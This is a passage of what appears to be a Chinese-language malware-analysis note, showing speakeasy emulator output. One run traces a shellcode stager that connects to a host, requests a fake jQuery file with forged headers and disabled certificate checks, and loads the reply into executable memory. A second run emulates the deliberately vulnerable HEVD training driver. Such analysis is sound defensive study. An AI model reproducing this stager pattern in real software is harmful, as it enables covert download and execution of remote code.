+<pre><code>root@1:/home/popo# speakeasy -t payload.bin -r -a x64
+* exec: shellcode
+0x10ef: 'kernel32.LoadLibraryA(&quot;wininet&quot;)' -&gt; 0x7bc00000
+0x1107: 'wininet.InternetOpenA(0x0, 0x0, 0x0, 0x0, 0x0)' -&gt; 0x20
+0x1129: 'wininet.InternetConnectA(0x20, &quot;192.168.14.128&quot;, 0x1bb, 0x0, 0x0, 0x3, 0x0, 0x0)' -&gt; 0x24
+0x1148: 'wininet.HttpOpenRequestA(0x24, 0x0, &quot;/jquery-3.3.2.slim.min.js&quot;, 0x0, 0x0, 0x0, &quot;INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE&quot;, 0x0)' -&gt; 0x28
+0x1172: 'wininet.InternetSetOptionA(0x28, 0x1f, 0x1203ec0, 0x4)' -&gt; 0x1
+0x118c: 'wininet.HttpSendRequestA(0x28, &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\\nAccept-Language: en-US,en;q=0.5\r\\nReferer: http://code.jquery.com/\r\\nAccept-Encoding: gzip, deflate\r\\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\r\\n&quot;, 0xffffffffffffffff, 0x0, 0x11f9)' -&gt; 0x1
+0x134d: 'kernel32.VirtualAlloc(0x0, 0x400000, 0x1000, &quot;PAGE_EXECUTE_READWRITE&quot;)' -&gt; 0x450000
+0x136b: 'wininet.InternetReadFile(0x28, 0x450000, 0x2000, 0x1203e40)' -&gt; 0x1
+0x136b: 'wininet.InternetReadFile(0x28, 0x451000, 0x2000, 0x1203e40)' -&gt; 0x1
+0x450fb0: Unhandled interrupt: intnum=0x3
+0x450fb0: shellcode: Caught error: unhandled_interrupt
+* Finished emulating
+</code></pre>
+<p>模拟驱动</p>
+<pre><code>root@1:/home/popo# speakeasy -t HEVD.sys
+* exec: 27
+0x14008a035: 'ntoskrnl.RtlInitUnicodeString(0x1200f68, &quot;\\Device\\HackSysExtremeVulnerableDriver&quot;)' -&gt; None
+0x14008a046: 'ntoskrnl.RtlInitUnicodeString(0x1200f58, &quot;\\DosDevices\\HackSysExtremeVulnerableDriver&quot;)' -&gt; None
+0x14008a071: 'ntoskrnl.IoCreateDevice(0x7eb870, 0x0, &quot;\\Device\\HackSysExtremeVulnerableDriver&quot;, 0x22, 0x100, 0x0, 0x1200f98)' -&gt; 0x0
+0x14008a0ef: 'ntoskrnl.IoCreateSymbolicLink(&quot;\\DosDevices\\HackSysExtremeVulnerableDriver&quot;, &quot;\\Device\\HackSysExtremeVulnerableDriver&quot;)' -&gt; 0x0
+0x14008a10d: 'ntoskrnl.DbgPrintEx(0x4d, 0x3, &quot;                                        \\n ##     ## ######## ##     ## ########  \\n ##     ## ##       ##     ## ##     ## \\n ##     ## ##       ##     ## ##     ## \\n ######### ######   ##     ## ##     ## \\n ##     ## ##        ##   ##  ##     ## \\n ##     ## ##         ## ##   ##     ## \\n ##     ## ########    ###    ########  \\n   HackSys Extreme Vulnerable Driver    \\n             Version: 3.00              \\n&quot;)' -&gt; 0x19a
+0x14008a122: 'ntoskrnl.DbgPrintEx(0x4d, 0x3, &quot;[+] HackSys Extreme Vulnerable Driver Loaded\\n&quot;)' -&gt; 0x2d
+* exec: 0
+0x140085070: 'ntoskrnl.IofCompleteRequest(0x7ebb20, 0x0)' -&gt; None
+* exec: 14
+0x1400855f0: 'ntoskrnl.DbgPrintEx(0x4d, 0x3, &quot;[-] Invalid IOCTL Code: 0x0\\n&quot;)' -&gt; 0x1c
+0x14008572e: 'ntoskrnl.IofCompleteRequest(0x7ebc90, 0x0)' -&gt; None
+* exec: 3
+0x140085767: 'ntoskrnl.IofCompleteRequest(0x7ebe00, 0x0)' -&gt; None
+* exec: 4
+0x140085767: 'ntoskrnl.IofCompleteRequest(0xbd4000, 0x0)' -&gt; None
+* exec: 2
+0x140085070: 'ntoskrnl.IofCompleteRequest(0xbd4170, 0x0)' -&gt; None
+* exec: 18
+0x140085767: 'ntoskrnl.IofCompleteRequest(0xbd42e0, 0x0)' -&gt; None
+* exec: 28
+0x140085027: 'ntoskrnl.RtlInitUnicodeString(0x1200f98, &quot;\\DosDevices\\HackSysExtremeVulnerableDriver&quot;)' -&gt; None
+0x140085032: 'ntoskrnl.IoDeleteSymbolicLink(&quot;\\DosDevices\\HackSysExtremeVulnerableDriver&quot;)' -&gt; 0x0
+0x14008503c: 'ntoskrnl.IoDeleteDevice(0x3fd000)' -&gt; 0x0
+0x140085051: 'ntoskrnl.DbgPrintEx(0x4d, 0x3, &quot;[-] HackSys Extreme Vulnerable Driver Unloaded\\n&quot;)' -&gt; 0x2f
+* Finished emulating
 </code></pre>
 <h1 id="_52">书籍</h1>
 <p>https://alice.climent-pommeret.red/posts/a-syscall-journey-in-the-windows-kernel/</p>
